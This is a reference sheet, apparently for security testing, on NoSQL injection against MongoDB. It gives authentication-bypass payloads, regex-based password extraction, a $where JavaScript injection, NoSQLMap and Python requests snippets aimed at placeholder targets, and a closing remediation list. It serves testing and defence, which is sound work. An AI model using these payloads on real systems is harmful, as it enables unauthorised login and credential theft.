# API Reference: NoSQL Injection Testing

## MongoDB Query Operators

| Operator | Description | Injection Use |
|----------|-------------|---------------|
| `$ne` | Not equal | Bypass authentication |
| `$gt` | Greater than | Extract data |
| `$regex` | Regular expression | Pattern matching |
| `$exists` | Field exists | Enumerate fields |
| `$where` | JavaScript expression | Code execution |
| `$or` | Logical OR | Logic bypass |

## Authentication Bypass Payloads

### GET Parameters
```
?username[$ne]=&password[$ne]=
?username=admin&password[$gt]=
?username[$regex]=admin.*&password[$ne]=
```

### JSON Body
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

## Data Extraction

### Regex-Based Extraction
```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^ad"}, "password": {"$ne": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": ""}}
```

### $where JavaScript Injection
```json
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
```

## Error-Based Detection

### MongoDB Error Messages
| Error | Indicator |
|-------|-----------|
| `MongoError` | MongoDB driver error |
| `CastError` | Invalid ObjectId |
| `BSONTypeError` | Invalid BSON type |
| `SyntaxError` | JavaScript parse error |

## Testing Tools

### NoSQLMap
```bash
python nosqlmap.py --url http://target/api/login --method POST \
    --data '{"username":"test","password":"test"}'
```

### Burp Suite Intruder
Use NoSQL payload wordlist with parameter fuzzing.

## Python requests Testing

### GET Injection
```python
import requests
url = "http://target/api/users"
resp = requests.get(f"{url}?username[$ne]=&password[$ne]=")
```

### JSON Injection
```python
payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
resp = requests.post(url, json=payload)
```

## Remediation
1. Use parameterized queries (never concatenate user input)
2. Validate input types (reject objects where strings expected)
3. Use `mongo-sanitize` or equivalent input sanitization
4. Disable `$where` operator if not needed
5. Implement proper authentication (don't rely on query-level checks)
